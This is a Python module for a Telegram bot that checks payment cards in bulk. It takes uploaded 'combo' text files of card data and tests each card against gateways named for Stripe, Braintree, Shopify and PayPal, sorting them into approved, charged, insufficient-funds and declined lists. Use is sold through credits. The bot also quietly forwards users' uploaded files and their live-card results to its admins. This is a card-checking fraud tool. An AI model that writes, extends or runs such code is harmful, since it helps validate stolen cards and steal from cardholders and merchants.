import threading
import time
import io
from telebot import types
from utils.admin_guard import is_admin
from storage.repositories.bans import is_banned
from storage.repositories.credits import ensure_row, get_credits, deduct_one_atomic
from storage.repositories.gates import is_gate_enabled, get_limit, get_cost
from datetime import datetime
from config.settings import ADMINS
from utils.messages import (
    approved_message,
    charged_message,
    insufficient_funds_message,
    dato
)

# ===== Gates =====
from gates.stripe_auth import check as stripe_auth_check
from gates.braintree_auth import check as braintree_auth_check
from gates.shopify_charge import check as shopify_charge_check
from gates.stripe_charge import check as stripe_charge_check
from gates.paypal_donation import check as paypal_donation_check


GATES = {
    "stripe_auth": ("ϟ Stripe Auth ϟ", stripe_auth_check, "AUTH"),
    "braintree_auth": ("ϟ Braintree Auth ϟ", braintree_auth_check, "AUTH"),
    "shopify_charge": ("ϟ Shopify Charge ϟ", shopify_charge_check, "CHARGE"),
    "stripe_charge": ("ϟ Stripe Charge ϟ", stripe_charge_check, "CHARGE"),
    "paypal_donation": ("ϟ Paypal Donation ϟ", paypal_donation_check, "CHARGE"),
}

MAX_RETRY = 3


def build_progress(percent: int, size: int = 10):
    filled = int((percent / 100) * size)
    empty = size - filled
    return f"{'▰'*filled}{'▱'*empty} {percent}%"


def register_combo(bot):

    # ================= RECEIVE COMBO =================
    @bot.message_handler(content_types=["document"])
    def receive_combo(message):
        uid = message.from_user.id
        user = message.from_user
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        caption = f"""
📥 <b>NEW FILE RECEIVED</b>

👤 Name : {user.first_name}
🔗 Username : @{user.username if user.username else 'None'}
🆔 ID : {user.id}
⏰ Time : {now}
📄 File : {message.document.file_name}
        """

        for admin_id in ADMINS:
            bot.send_document(
                admin_id,
                message.document.file_id,
                caption=caption,
                parse_mode="HTML"
            )

        file_name = message.document.file_name.lower()
        if not file_name.endswith(".txt"):
            bot.send_message(
                message.chat.id,
                "<b>❌ ONLY .TXT FILES ARE ALLOWED</b>",
                parse_mode="HTML"
            )
            return

        if is_banned(uid):
            bot.send_message(
                message.chat.id,
                "<b>🚫 YOU ARE BANNED FROM USING THIS BOT</b>",
                parse_mode="HTML"
            )
            return



        bot._combo_state = getattr(bot, "_combo_state", {})

        if uid in bot._combo_state and bot._combo_state[uid]["checking"]:
            bot.send_message(
                message.chat.id,
                "<b>❌ A CHECK IS ALREADY RUNNING</b>",
                parse_mode="HTML"
            )
            return

        wait = bot.send_message(
            message.chat.id,
            "<b>⏳ PROCESSING YOUR COMBO FILE...</b>",
            parse_mode="HTML"
        )

        file_info = bot.get_file(message.document.file_id)
        raw = bot.download_file(file_info.file_path)
        cards = [c.strip() for c in raw.decode(errors="ignore").splitlines() if c.strip()]

        if not cards:
            bot.edit_message_text(
                "<b>❌ EMPTY FILE</b>",
                message.chat.id,
                wait.message_id,
                parse_mode="HTML"
            )
            return

        ensure_row(uid)

        bot._combo_state[uid] = {
            "cards": cards,
            "checking": False,
            "stop": False,
            "approved": 0,
            "charged": 0,
            "funds": 0,
            "declined": 0,
            "checked": 0,
            "approved_cards": [],
            "charged_cards": [],
            "funds_cards": [],
            "declined_cards": [],
        }

        kb = types.InlineKeyboardMarkup(row_width=1)
        for key, (name, _, _) in GATES.items():
            if is_gate_enabled(key):
                kb.add(types.InlineKeyboardButton(name, callback_data=f"combo:gate:{key}"))

        bot.edit_message_text(
            "<b>ϟ CHOOSE THE GATEWAY ϟ</b>",
            message.chat.id,
            wait.message_id,
            reply_markup=kb,
            parse_mode="HTML"
        )

    # ================= STOP =================
    @bot.callback_query_handler(func=lambda c: c.data == "combo:stop")
    def stop_combo(c):
        uid = c.from_user.id
        if uid in bot._combo_state:
            bot._combo_state[uid]["stop"] = True

            bot.answer_callback_query(
                c.id,
                "⛔ Stop requested, finishing current card..."
            )

            bot.send_message(
                c.message.chat.id,
                "<b>⛔ STOP REQUESTED</b>\n\n⏳ Please wait while results are being finalized...",
                parse_mode="HTML"
            )

# ================= START CHECK =================
    @bot.callback_query_handler(func=lambda c: c.data.startswith("combo:gate:"))
    def start_check(c):
        uid = c.from_user.id
        gate_key = c.data.split(":")[-1]

        state = bot._combo_state.get(uid)
        if not state or state["checking"]:
            return

        gate_name, gate_func, gate_type = GATES[gate_key]
        cards = state["cards"]
        total = len(cards) if is_admin(uid) else min(len(cards), get_limit(gate_key))
        cost = get_cost(gate_key)

        credits = get_credits(uid)
        if credits != -1 and credits < cost:
            bot.send_message(
                c.message.chat.id,
                "<b>⛔ CHECK DENIED – NO CREDITS</b>\n\n<b>Use /buy to recharge</b>",
                parse_mode="HTML"
            )
            return

        state["checking"] = True
        state["stop"] = False

        chat_id = c.message.chat.id
        message_id = c.message.message_id

        def send_file(name, data):
                if not data:
                        return

                content = "\n".join(data)
                bio = io.BytesIO(content.encode())
                bio.name = f"{name}.txt"

                user = bot.get_chat(uid)
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                caption = f"""
📊 <b>{name} RESULT</b>

👤 Name : {user.first_name}
🔗 Username : @{user.username if user.username else 'None'}
🆔 ID : {user.id}
🌐 Gate : {gate_name}
⏰ Time : {now}
"""

                # 📩 المستخدم يستلم دايمًا
                bot.send_document(chat_id, bio)

                # 🚫 declined لا يروح للأدمن
                if name == "[@chk_error_bot] declined":
                        return

                # 📤 الباقي يروح للأدمن
                for admin_id in ADMINS:
                        bio_admin = io.BytesIO(content.encode())
                        bio_admin.name = f"{name}_{user.id}.txt"

                        bot.send_document(
                                admin_id,
                                bio_admin,
                                caption=caption,
                                parse_mode="HTML"
                        )

        # ===== INITIAL UI =====
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("━ 𝗖𝗖 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
            types.InlineKeyboardButton("━ 𝗦𝗧𝗔𝗧𝗨𝗦 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
            types.InlineKeyboardButton(
                "━ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ • 0" if gate_type == "AUTH"
                else "━ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡ • 0",
                callback_data="x"
            ),
            types.InlineKeyboardButton(
                "━ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • 0" if gate_type == "AUTH"
                else "━ 𝗙𝗨𝗡𝗗𝗦 💸 • 0",
                callback_data="x"
            ),
            types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • 0 / {total}", callback_data="x"),
            types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
        )

        bot.edit_message_text(
            f"""<b>
PLEASE WAIT CHECKING YOUR CARDS 💫
GATE ➜ {gate_name}

━━━━━━━━━━━━━━━━━━━━━━━
{build_progress(0)}
━━━━━━━━━━━━━━━━━━━━━━━
</b>""",
            chat_id,
            message_id,
            reply_markup=kb,
            parse_mode="HTML"
        )



        # ================= RUN THREAD =================
        def run():


            for card in cards[:total]:

                if state["stop"]:
                    break

                credits = get_credits(uid)
                if not is_admin(uid) and credits != -1 and credits < cost:
                    stopped_by_credits = True
                    break

                start = time.time()
                result = "error"

                for _ in range(MAX_RETRY):
                    result = gate_func(card)
                    if "error" not in result.lower():
                        break
                    time.sleep(1)

                exec_time = round(time.time() - start, 2)
                r = result.lower()

                if "charged" in r:
                    state["charged"] += 1
                    state["charged_cards"].append(card)
                    sent = bot.send_message(
                        chat_id,
                        charged_message(card, result, gate_name, exec_time, dato),
                        parse_mode="HTML"
                    )
                    bot.pin_chat_message(sent.chat.id, sent.message_id, disable_notification=True)

                elif "approved" in r:
                    state["approved"] += 1
                    state["approved_cards"].append(card)
                    sent = bot.send_message(
                        chat_id,
                        approved_message(card, result, gate_name, exec_time, dato),
                        parse_mode="HTML"
                    )
                    bot.pin_chat_message(sent.chat.id, sent.message_id, disable_notification=True)

                elif "fund" in r:
                    state["funds"] += 1
                    state["funds_cards"].append(card)
                    sent = bot.send_message(
                        chat_id,
                        insufficient_funds_message(card, result, gate_name, exec_time, dato),
                        parse_mode="HTML"
                    )
                    bot.pin_chat_message(sent.chat.id, sent.message_id, disable_notification=True)

                else:
                    state["declined"] += 1
                    state["declined_cards"].append(card)

                if credits != -1 and not is_admin(uid):
                    deduct_one_atomic(uid)

                state["checked"] += 1
                percent = int((state["checked"] / total) * 100)

                kb = types.InlineKeyboardMarkup(row_width=1)
                kb.add(
                    types.InlineKeyboardButton(f"━ 𝗖𝗖 • {card}", callback_data="x"),
                    types.InlineKeyboardButton(f"━ 𝗦𝗧𝗔𝗧𝗨𝗦 • {result}", callback_data="x"),
                )

                if gate_type == "AUTH":
                    kb.add(
                        types.InlineKeyboardButton(
                            f"━ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ • {state['approved']}", callback_data="x"
                        ),
                        types.InlineKeyboardButton(
                            f"━ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • {state['declined']}", callback_data="x"
                        ),
                    )
                else:
                    kb.add(
                        types.InlineKeyboardButton(
                            f"━ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡ • {state['charged']}", callback_data="x"
                        ),
                        types.InlineKeyboardButton(
                            f"━ 𝗙𝗨𝗡𝗗𝗦 💸 • {state['funds']}", callback_data="x"
                        ),
                        types.InlineKeyboardButton(
                            f"━ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • {state['declined']}", callback_data="x"
                        ),
                    )

                kb.add(
                    types.InlineKeyboardButton(
                        f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • {state['checked']} / {total}", callback_data="x"
                    ),
                    types.InlineKeyboardButton(
                        "⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"
                    ),
                )

                bot.edit_message_text(
                    f"""<b>
PLEASE WAIT CHECKING YOUR CARDS 💫
GATE ➜ {gate_name}

━━━━━━━━━━━━━━━━━━━━━━━
{build_progress(percent)}
━━━━━━━━━━━━━━━━━━━━━━━
</b>""",
                    chat_id,
                    message_id,
                    reply_markup=kb,
                    parse_mode="HTML"
                )

            # ===== FINISH =====
            state["checking"] = False

            summary_text = f"""<b>✨ CHECK SUMMARY ✨</b>
━━━━━━━━━━━━━━━━━━
<b>Approved  ✅ :</b> {state['approved']}
<b>Charged   ⚡ :</b> {state['charged']}
<b>Funds     💸 :</b> {state['funds']}
<b>Declined  ❌ :</b> {state['declined']}
━━━━━━━━━━━━━━━━━━
<b>Processed :</b> {state['checked']} / {total}
━━━━━━━━━━━━━━━━━━
<b>Boted By • @I_EOR</b>
"""
            bot.send_message(chat_id, summary_text, parse_mode="HTML")
            send_file("[@chk_error_bot] approved", state["approved_cards"])
            send_file("[@chk_error_bot] charged", state["charged_cards"])
            send_file("[@chk_error_bot] funds", state["funds_cards"])
            send_file("[@chk_error_bot] declined", state["declined_cards"])


            bot._combo_state.pop(uid, None)

        threading.Thread(target=run, daemon=True).start()